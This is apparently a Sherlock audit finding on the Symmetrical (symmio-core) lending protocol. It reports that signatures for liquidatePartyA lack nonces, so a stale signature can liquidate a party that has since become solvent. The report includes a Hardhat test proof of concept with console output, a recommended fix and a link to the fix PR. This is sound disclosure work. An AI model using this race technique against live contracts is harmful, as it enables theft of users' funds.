---
tags:
  - lang/solidity
  - sector/lending
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
protocol: "[[Symmetrical Update]]"
auditors:
  - "[[panprog]]"
report: "https://github.com/sherlock-audit/2023-08-symmetrical-judging"
genome:
  - "[[liquidation-logic]]"
  - "[[direct-drain]]"
  - "[[liquidation-underwater]]"
---
# H-1: `liquidatePartyA` requires signature which doesn't have nonce, making possible unfair liquidation and loss of funds for all parties

- id: 26346
- impact: HIGH
- protocol: [[Symmetrical Update]]
- reporter: panprog (Sherlock)
- source: N/A

## Summary


A bug was found in the `liquidatePartyA` function of the SYMM-IO/symmio-core repository. This function requires a signature to be provided by the liquidator, but this signature does not contain nonces of either partyA or partyB. This can lead to unfair liquidation and loss of funds for all parties involved. 

An example scenario is provided to demonstrate the vulnerability: PartyA has allocated balance of 109, upnl of -99, and cva+lf of 10. To avoid liquidation, PartyA tries to close 50% of its position, submitting requestToClosePosition. However, PartyB at the same time fulfills PartyA's request, resulting in PartyA having allocated balance of 59, upnl of -50, and cva+lf of 5 (not liquidatable anymore). The liquidator then submits a liquidating transaction (with upnl of -100), resulting in PartyA having no allocated balance, PartyB receiving 27 instead of full 50 profit, and the liquidator not receiving any fee.

The code snippet provided shows that there are no nonces of either party in the liquidation signature. A pull request has been submitted to fix this issue. The recommendation is to include partyA and partyB nonces in the liquidation signature.

## Details

Source: https://github.com/sherlock-audit/2023-08-symmetrical-judging/issues/5 

## Found by 
panprog, xiaoming90

`liquidationSig` provided by liquidator to `liquidatePartyA` doesn't have nonces of neither partyA nor partyB. This means that this signature is valid even if partyA and/or partyB do some actions before the liquidation with this signature happens. There are numerous scenarios possible, both happening by itself and caused by malicious parties, where this can lead to loss of funds for some or all parties involved.

## Vulnerability Detail

Example Scenario:

1. PartyA: allocated=109, upnl=-99, cva+lf=10. To avoid liquidation, partyA tries to close 50% of its position, submitting requestToClosePosition
2. PartyA: allocated=109, upnl=-100, cva+lf=10. PartyA becomes liquidatable
3. Liquidator submits liquidating transaction (with upnl=-100), but partyB at the same time fulfills partyA request
3. partyB transaction executes first, partyA has: allocated = 59, upnl=-50, cva+lf=5 (not liquidatable anymore)
4. Liquidator transaction executes (with upnl=-100):
4.1. Available Balance = 59-5 - 100 = -46
4.2. Liquidation type = OVERDUE (46 > 5), deficit = 41
4.3. Corresponding partyB receives 50 - 50*46/100 = 27
4.4. PartyA allocated balance is set to 0
4.5. Liquidators receives 0 (because it's OVERDUE liquidation)

The result: 
1. PartyA was solvent just before the liquidation, but was still liquidated, losing all funds
2. PartyB has received 27 instead of full 50 profit (even though partyA had enough funds)
3. Liquidator didn't receive any fee, although it should have received it as partyA had enough funds.

All 3 parties have lost funds. Protocol basically stole those funds.

## Impact

Unfair liquidation for partyA, loss of funds for liquidator and partyB in many possible situations during partyA liquidation - happening by itself or caused by malicious actors.

## Proof of Concept

Add this to any test, for example to `ClosePosition.behavior.ts`.

```ts
it("PartyA wrong upnl liquidation", async function () {
  const context: RunContext = this.context;

  this.user_allocated = decimal(119);
  this.hedger_allocated = decimal(1000);
  
  this.user = new User(this.context, this.context.signers.user);
  await this.user.setup();
  await this.user.setBalances(this.user_allocated, this.user_allocated, this.user_allocated);

  this.hedger = new Hedger(this.context, this.context.signers.hedger);
  await this.hedger.setup();
  await this.hedger.setBalances(this.hedger_allocated, this.hedger_allocated);

  this.liquidator = new User(this.context, this.context.signers.liquidator);
  await this.liquidator.setup();

  // open position (100 @ 10)
  await this.user.sendQuote(limitQuoteRequestBuilder()
    .positionType(PositionType.LONG)
    .quantity(decimal(100))
    .price(decimal(10))
    .cva(decimal(6)).lf(decimal(4)).mm(decimal(10))
    .build()
  );
  await this.hedger.lockQuote(1, 0, decimal(1));
  await this.hedger.openPosition(1, limitOpenRequestBuilder().filledAmount(decimal(100)).openPrice(decimal(10)).price(decimal(10)).build());

  var info = await this.user.getBalanceInfo();
  console.log("partyA allocated: " + info.allocatedBalances / 1e18 + " locked: " + info.totalLocked/1e18 + " pendingLocked: " + info.totalPendingLocked / 1e18);
  var info = await this.hedger.getBalanceInfo(this.user.getAddress());
  console.log("partyB allocated: " + info.allocatedBalances / 1e18 + " locked: " + info.totalLocked/1e18 + " pendingLocked: " + info.totalPendingLocked / 1e18);

  // price goes to 9, so user is in a loss of -100 (less fee), locked balance = 10, so liquidatable
  // user tries to close half of its position to save liquidation
  //await this.user.setBalances(this.user_allocated, this.user_allocated, this.user_allocated);
  await this.user.requestToClosePosition(
    1,
    limitCloseRequestBuilder().quantityToClose(decimal(50)).closePrice(decimal(9)).build(),
  );

  // liquidators obtains signature to liquidate
  var sig = await getDummyLiquidationSig("0x10", decimal(-100), [1], [decimal(9)], decimal(-100));
  // fix timestamp
  sig.timestamp = BigNumber.from(await sig.timestamp).add(5);

  // but before liquidation, partyB fullfills partyA close request
  await this.hedger.fillCloseRequest(
    1,
    limitFillCloseRequestBuilder()
      .filledAmount(decimal(50))
      .closedPrice(decimal(9))
      .build(),
  );

  var info = await this.user.getBalanceInfo();
  console.log("after closing: partyA allocated: " + info.allocatedBalances / 1e18 + " locked: " + info.totalLocked/1e18 + " pendingLocked: " + info.totalPendingLocked / 1e18);
  var info = await this.hedger.getBalanceInfo(this.user.getAddress());
  console.log("after closing: partyB allocated: " + info.allocatedBalances / 1e18 + " locked: " + info.totalLocked/1e18 + " pendingLocked: " + info.totalPendingLocked / 1e18);

  // liquidator starts liquidating partyA
  await context.liquidationFacet.connect(this.liquidator.signer).liquidatePartyA(
    this.user.signer.address,
    sig
  );
  await context.liquidationFacet.connect(this.liquidator.signer).setSymbolsPrice(
    this.user.signer.address,
    sig
  );
  await context.liquidationFacet.connect(this.liquidator.signer).liquidatePositionsPartyA(
    this.user.signer.address,
    [1]
  );

  var info = await this.user.getBalanceInfo();
  console.log("after liquidation: partyA allocated: " + info.allocatedBalances / 1e18 + " locked: " + info.totalLocked/1e18 + " pendingLocked: " + info.totalPendingLocked / 1e18);
  var info = await this.hedger.getBalanceInfo(this.user.getAddress());
  console.log("after liquidation: partyB allocated: " + info.allocatedBalances / 1e18 + " locked: " + info.totalLocked/1e18 + " pendingLocked: " + info.totalPendingLocked / 1e18);

});
```

Console execution result:
```js
partyA allocated: 109 locked: 20 pendingLocked: 0
partyB allocated: 1000 locked: 20 pendingLocked: 0
after closing: partyA allocated: 59 locked: 10 pendingLocked: 0
after closing: partyB allocated: 1050 locked: 10 pendingLocked: 0
after liquidation: partyA allocated: 0 locked: 0 pendingLocked: 0
after liquidation: partyB allocated: 1079.5 locked: 0 pendingLocked: 0
liquidator balance: 0
```
As can be noticed, partyA + partyB have 1109 total after closing, but only 1079.5 after liquidation.

If the `fillCloseRequest` is commented out, then liquidation produces correct result:
```js
partyA allocated: 109 locked: 20 pendingLocked: 0
partyB allocated: 1000 locked: 20 pendingLocked: 0
after liquidation: partyA allocated: 0 locked: 0 pendingLocked: 0
after liquidation: partyB allocated: 1106 locked: 0 pendingLocked: 0
liquidator balance: 3
```

## Code Snippet

Notice that there are no nonces of either party in the liquidation signature:
https://github.com/sherlock-audit/2023-08-symmetrical/blob/main/symmio-core/contracts/libraries/LibMuon.sol#L54-L67

## Tool used

Manual Review

## Recommendation

Include partyA and partyB nonces in the liquidation signature.



## Discussion

**MoonKnightDev**

Fixed Code PR: https://github.com/SYMM-IO/symmio-core/pull/34
